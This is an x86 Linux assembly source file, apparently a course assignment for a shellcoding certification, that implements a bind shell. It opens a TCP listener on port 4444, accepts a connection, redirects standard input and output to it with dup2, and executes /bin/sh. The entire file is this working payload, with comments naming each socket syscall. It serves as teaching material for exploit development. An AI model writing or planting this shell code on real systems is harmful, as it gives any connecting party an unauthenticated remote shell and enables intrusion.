;Author: Aaron Weathersby
;SLAE #1488
;Handle: t0b0x0r
;github:https://github.com/t0b0rX0r/slae/upload/master/assignment1
;Assignment #2- Bind Shell
;created for completing the requirements of the SecurityTube Linux Assembly Expert certification: http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert

global _start

section .bss           ;Uninitialized data
   input resb 4

section .text

_start :

%assign AF_INET 2
%assign  SYS_SOCKET 1; sys_socket = 1 
%assign SOCK_STREAM 1 ; Connection TCP 
%assign SYS_BIND 2; sys_bind = 2
%assign SYS_LISTEN 4; sys_ listen =4
%assign SYS_ACCEPT 5; socket


;Socket
	xor eax,eax
	mov al,0x66 ; syscall - socketcall
	mov bl, SYS_SOCKET ; type sys_socket
	; socket(domain,type,protocol)
	xor edx,edx
	push edx ; protocol
	push SOCK_STREAM ; type
	push AF_INET ; domain 2
	mov ecx, esp

	int 0x80
	mov esi,eax
;bind
	mov al,102
	mov bl, SYS_BIND
	; bind (sockfd, struct sockaddr * addr, socklen_t addrlen)
	; bind (eax [4444,2],??)

	; build struct sockaddr
	;push AF_INET;
	push edx
	;push input ;userinput of port bind
	push word 0x5c11; port 4444 DEC -> HEX, little endian
	push word AF_INET ; 
	mov ecx,esp

	;build bind
	push byte 0x10; length ...need to figure out how to calculate
	push ecx ; point er to sockaddr
	mov edi,esi ; copy fd
	push esi ; fd

	mov ecx,esp ; make pointer to args into ecx

	int 0x80
;listen
; listen(sockfd,int backlog)
	mov esi,edi ; copy fd to esi
	mov al, 102
	mov bl, SYS_LISTEN ; 4
	push edx ; backlog
	push esi ;  fd =3
	mov ecx,esp
	int 0x80

;accept
; accept(sockfd,struct sockaddr,*socklen)
	mov al,102
	mov bl, SYS_ACCEPT
	push edx
	push edx
	;push 0x3
	push esi ; fd=3
	mov ecx,esp
	int 0x80
; redirect to STDIN
;exec shell

mov bl,al ;return value is in eax, is the new FD! ...had to fix this to make it work
xor ecx,ecx
; dup2 (old,new)
; dup2(ebx,ecx++)
builddup:
	mov al,0x3f ; dup2 63 system call
	int 0x80
	inc ecx
	cmp cl,0x4

	jne builddup
xor eax,eax
push  eax
push 0x68732f2f
push 0x6e69622f
mov ebx, esp
mov ecx,edx ; move zero
mov al, 0xb
int 0x80
